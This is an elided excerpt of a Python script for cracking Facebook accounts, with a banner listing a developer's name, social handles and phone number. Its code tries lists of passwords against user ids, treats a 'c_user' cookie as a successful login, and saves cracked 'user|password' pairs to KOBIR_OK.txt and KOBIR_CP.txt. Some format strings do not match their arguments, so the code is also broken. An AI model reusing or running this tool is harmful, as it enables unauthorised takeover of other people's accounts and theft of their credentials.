...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD JAHANGIR ALAM

     \033[1;91m➣ \033[1;91mFACEBOOK   :            MD. JAHANGIR ALAM

     \033[1;92m➣ \033[1;92mWHATSAPP   :            01710290284

     \033[1;91m➣ \033[1;91mGITHUB     :            BCF-71
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mKOBIR_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mKOBIR_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;93mPress enter to back KOBIR Menu ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;93m[KOBIR-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [KOBIR-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('KOBIR_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [KOBIR-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('KOBIR_CP.txt' , 'a').write('%s\n' % wrt)
